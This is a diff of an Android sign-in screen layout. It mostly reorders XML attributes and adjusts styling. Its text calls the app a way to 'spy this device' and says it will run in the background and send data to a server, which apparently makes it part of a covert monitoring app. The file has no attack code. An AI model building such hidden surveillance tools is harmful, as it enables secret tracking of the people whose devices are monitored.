@@ -4,15 +4,15 @@
     xmlns:tools="http://schemas.android.com/tools"
     android:layout_width="match_parent"
     android:layout_height="match_parent"
-    android:background="#90caf9"
+    android:background="@color/colorPrimary"
     tools:context=".MainActivity">
 
     <androidx.constraintlayout.widget.ConstraintLayout
         android:layout_width="match_parent"
         android:layout_height="wrap_content"
+        android:background="#e3f2fd"
         android:paddingStart="36dp"
         android:paddingEnd="36dp"
-        android:background="#e3f2fd"
         app:layout_constraintBottom_toBottomOf="parent"
         app:layout_constraintEnd_toEndOf="parent"
         app:layout_constraintStart_toStartOf="parent"
@@ -20,39 +20,40 @@
 
         <TextView
             android:id="@+id/tv_title"
+            style="@style/text"
             android:layout_width="0dp"
             android:layout_height="wrap_content"
-            style="@style/text"
-            android:gravity="center_horizontal"
             android:fontFamily="sans-serif-black"
+            android:gravity="center_horizontal"
+            android:paddingTop="8dp"
             android:text="Sign in"
             android:textAllCaps="true"
             android:textSize="28sp"
-            app:layout_constraintTop_toTopOf="parent"
             app:layout_constraintEnd_toEndOf="parent"
-            app:layout_constraintStart_toStartOf="parent" />
+            app:layout_constraintStart_toStartOf="parent"
+            app:layout_constraintTop_toTopOf="parent" />
 
         <TextView
             android:id="@+id/tv_subtitle"
+            style="@style/text"
             android:layout_width="0dp"
             android:layout_height="wrap_content"
+            android:layout_marginTop="16dp"
             android:fontFamily="sans-serif-medium"
-            style="@style/text"
             android:gravity="center_horizontal"
             android:text="Use your account to connect and spy this device"
             android:textSize="20sp"
-            android:layout_marginTop="16dp"
             app:layout_constraintEnd_toEndOf="parent"
             app:layout_constraintStart_toStartOf="parent"
             app:layout_constraintTop_toBottomOf="@id/tv_title" />
 
         <TextView
             android:id="@+id/tv_alert"
+            style="@style/text"
             android:layout_width="0dp"
             android:layout_height="wrap_content"
-            style="@style/text"
-            android:fontFamily="sans-serif-condensed-medium"
             android:layout_marginTop="16dp"
+            android:fontFamily="sans-serif-condensed-medium"
             android:text="This screen is visible only once. Don't leave it until you sign in into your account. After you leave this screen, the application will run in the background and send data to server."
             android:textSize="16sp"
             app:layout_constraintEnd_toEndOf="parent"
@@ -61,56 +62,60 @@
 
         <EditText
             android:id="@+id/et_email"
+            style="@style/text"
             android:layout_width="match_parent"
             android:layout_height="wrap_content"
             android:layout_marginTop="16dp"
-            style="@style/text"
             android:hint="E-mail address"
             android:inputType="textEmailAddress"
             android:maxLines="1"
+            android:textColorHint="@color/colorPrimary"
+            android:tint="@color/colorPrimary"
             app:layout_constraintEnd_toEndOf="parent"
             app:layout_constraintStart_toStartOf="parent"
             app:layout_constraintTop_toBottomOf="@id/tv_alert" />
 
         <EditText
             android:id="@+id/et_password"
+            style="@style/text"
             android:layout_width="match_parent"
             android:layout_height="wrap_content"
             android:layout_marginTop="16dp"
             android:hint="Password"
-            style="@style/text"
             android:inputType="textPassword"
             android:maxLines="1"
+            android:textColorHint="@color/colorPrimary"
+            android:tint="@color/colorPrimary"
             app:layout_constraintEnd_toEndOf="parent"
             app:layout_constraintStart_toStartOf="parent"
-            app:layout_constraintTop_toBottomOf="@id/et_email"/>
+            app:layout_constraintTop_toBottomOf="@id/et_email" />
 
-<!--            android:background="@drawable/bg_button"-->
         <Button
             android:id="@+id/btn_connect"
             android:layout_width="match_parent"
             android:layout_height="wrap_content"
-            android:text="Connect with your account"
-            android:textColor="#fafafa"
-            android:enabled="true"
-            android:textStyle="bold"
-            android:fontFamily="sans-serif-medium"
             android:layout_marginTop="16dp"
+            android:layout_marginBottom="8dp"
+            android:background="@drawable/bg_button"
+            android:enabled="false"
+            android:fontFamily="sans-serif-medium"
+            android:text="Connect with your account"
+            android:textStyle="bold"
+            app:layout_constraintBottom_toBottomOf="parent"
             app:layout_constraintEnd_toEndOf="parent"
             app:layout_constraintStart_toStartOf="parent"
-            app:layout_constraintTop_toBottomOf="@id/et_password"
-            app:layout_constraintBottom_toBottomOf="parent"/>
+            app:layout_constraintTop_toBottomOf="@id/et_password" />
 
         <ProgressBar
             android:id="@+id/progressBar"
             android:layout_width="40dp"
             android:layout_height="40dp"
-            android:visibility="gone"
             android:theme="@style/ThemeOverlay.AppCompat.Dark"
+            android:visibility="gone"
+            app:layout_constraintBottom_toBottomOf="parent"
             app:layout_constraintEnd_toEndOf="parent"
             app:layout_constraintStart_toStartOf="parent"
-            app:layout_constraintTop_toBottomOf="@id/et_password"
-            app:layout_constraintBottom_toBottomOf="parent"/>
+            app:layout_constraintTop_toBottomOf="@id/et_password" />
 
     </androidx.constraintlayout.widget.ConstraintLayout>
 
